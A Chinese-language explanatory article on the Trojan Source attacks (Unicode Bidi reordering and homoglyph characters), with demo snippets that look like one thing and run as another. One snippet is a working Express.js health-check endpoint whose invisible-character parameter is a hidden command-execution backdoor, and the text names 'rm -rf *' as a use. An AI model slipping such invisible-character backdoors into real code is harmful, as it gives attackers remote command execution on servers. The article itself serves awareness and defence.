## 引言  

一个简单的例子  

~~~python
ꓐ = 1
B = 2
print(ꓐ)
~~~

这端代码看起来结果是 2 但实际上结果是1  
因为 `ꓐ` 与 `B` 并不是同一个字符, 尽管它们看起来长得一模一样  


## Trojan Source  

剑桥大学的研究人员在11月1日公开了一个会影响大多数编译器和软件开发环境的漏洞，并命名为 **Trojan Source**  
>论文: [《Trojan Source: Invisible Vulnerabilities》](https://trojansource.codes/trojan-source.pdf)  

该漏洞基于 **Unicode** 字符的特性，其主要有两种利用方法  
* 第一种是使用 Unicode 的 Bidi 算法（CVE-2021-42574）, 对字符进行视觉上的重新排序，使其呈现与编译器和解释器所不同的逻辑顺序  
* 第二种是同形文字攻击(CVE-2021-42694), 也就是利用在视觉上看起来相似的不同字符  

由于绝大多数该漏洞适用于绝大多数编程语言  
因为大多数语言的 词法分析过程 允许使用所有unicode字符  

很多时候, 这个漏洞会被用于 供应链攻击  

> **供应链攻击**  
> 供应链攻击是一种传播间谍软件的方式，一般通过产品软件官网或软件包存储库进行传播  
> 通常来说，黑客会瞄准部署知名软件官网的服务器，篡改服务器上供普通用户下载的软件源代码，将间谍软件传播给前往官网下载软件的用户  
> 此外，黑客还会向一些软件开发者常用的软件包存储库如npm、PyPI和RubyGems等注入带有恶意代码的软件包。这些软件包在用户下载后安装时会触发恶意行为  


## 同形文字攻击(CVE-2021-42694)  

引言中的 DEMO 代码就属于此种  
或者写一个 看不出有后门的服务  

~~~js
const express = require('express');
const util = require('util');
const exec = util.promisify(require('child_process').exec);

const app = express();

app.get('/network_health', async (req, res) => {
    const { timeout,ㅤ} = req.query;
    const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/',ㅤ
    ];

    try {
        await Promise.all(checkCommands.map(cmd => 
                cmd && exec(cmd, { timeout: +timeout || 5_000 })));
        res.status(200);
        res.send('ok');
    } catch(e) {
        res.status(500);
        res.send('failed');
    }
});

app.listen(8080);
~~~

这段代码使用 Express 框架搭建了一个 API 接口，当你调用 http://127.0.0.1:8080/network_health 的时候, 后台会首先ping一下 Google，然后再使用curl访问 http://example.com  
如果都成功了，那么显然你的网络是正常的，于是给你返回ok  

这个功能简单得不能再简单了，能有什么问题呢？我现在就把代码放到你的面前让你来 Review , 你能说我的代码有问题？  
但实际上，上面这段代码确实有一个后门，可以让我在部署了这个接口的机器上执行任意命令，包括但不限于下载木马或者 `rm -rf *`  

~~~js
......
    const { timeout, 这里} = req.query;
    const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/',这里
    ];
......
~~~

因为代码中有两个肉眼不可见的字符, 利用它们就能够接收参数, 执行任何命令  


## Unicode 的 Bidi 攻击算法(CVE-2021-42574)  

并非所有的语言文字都是从左往右的, 例如阿拉伯语（从右到左阅读）  
计算机系统需要有一种确定性的方法来解决文本中的方向冲突  

Unicode 规定了一些方向指示字符，一旦使用了这些方向转换字符，文字方向就会改变  

|Abbreviation| Code Point |Name |Description|
|--|--|--|--|
|LRE| U+202A | Left-to-Right |Embedding Try treating following text as left-to-right.|
|RLE| U+202B | Right-to-Left |Embedding Try treating following text as right-to-left.|
|LRO| U+202D | Left-to-Right |Override Force treating following text as left-to-right.|
|RLO| U+202E | Right-to-Left |Override Force treating following text as right-to-left.|
|LRI| U+2066 | Left-to-Right |Isolate Force treating following text as left-to-right without affecting adjacent text.|
|RLI| U+2067 | Right-to-Left |Isolate Force treating following text as right-to-left without affecting adjacent text.|
|FSI| U+2068 | First Strong |Isolate Force treating following text in direction indicated by the next character.|
|PDF| U+202C | Pop Directional |Formatting Terminate nearest LRE, RLE, LRO, or RLO.|
|PDI| U+2069 | Pop Directional |Isolate Terminate nearest LRI or RLI.|


Unicode 标准规定, 内存表示顺序称为逻辑顺序,  
当文本在一行的时候, 大多数脚本会从左往右显示字符. 然而, 也有些脚本（如阿拉伯语）显示文本的自然顺序是从右往左  

所以 Unicode 规定了每个字符都有一个隐式双向类型  
从左到右 和 从右到左 的双向类型称为强类型，具有这些类型的字符被称为强方向字符  
与数字相关的双向类型被称为弱类型，具有这些类型的字符被称为弱方向字符  
除了方向格式码，剩下的双向类型和字符被称为中性  

为了处理 右往左的语言 与 从左往右的语言 同时使用的情况  
Unicode 规定了一个双向的算法 Bidirectional algorithm 简称 bidi  
标准bidi算法提供的显示顺序还不够，所以对于这些情况，提供了覆盖控制字符  
Bidi算法覆盖是不可见的字符，从而可以切换字符组的显示顺序  

假设Unicode 字符为： `RLI 1 2 3 PDI`  
那么将显示为：`3 2 1`  

大多数IDE会自动根据 覆盖控制字符 调整字符顺序  
但并非所有地方都会调整, 有些地方会按原本字符顺序显示  
比如: Github 上看到的 HTML 中的 代码内容是不会根据 覆盖控制字符 来调整顺序的   

例子: 1+1=2 不是吗？  

~~~
def simple_add():
    ''' I just want to ⁧''' ;return '2'
    return '3'

print('1 + 1 =', simple_add())
~~~

这段代码执行的结果是 `1 + 1 = 2`, 尽管怎么看都应该是 `1 + 1 = 3`  
这是因为这段代码使用了 `RLI` 这个 **覆盖控制符**  
将这个代码复制到 IDE 里, 它会显示出它原来的样貌，因为 IDE 会处理这个 **覆盖控制符**, 将之"还原"成"正确"的顺序    


## 参考  
* [《Trojan Source: Invisible Vulnerabilities》](https://trojansource.codes/trojan-source.pdf)  
* [Trojan 用例](https://github.com/nickboucher/trojan-source)  
* [Trojan Source：新型供应链攻击？隐藏在源代码中的“幽灵”](https://zhuanlan.zhihu.com/p/429284303)  
* [《漏洞之王：Unicode编译器漏洞威胁全球软件代码》](https://www.secrss.com/articles/35655)  
* [《一日一技：亲眼所见，也非真实，如何明目张胆架设后门程序》](https://mp.weixin.qq.com/s/qvHv_MfYbk6P5AqVjogapA)  
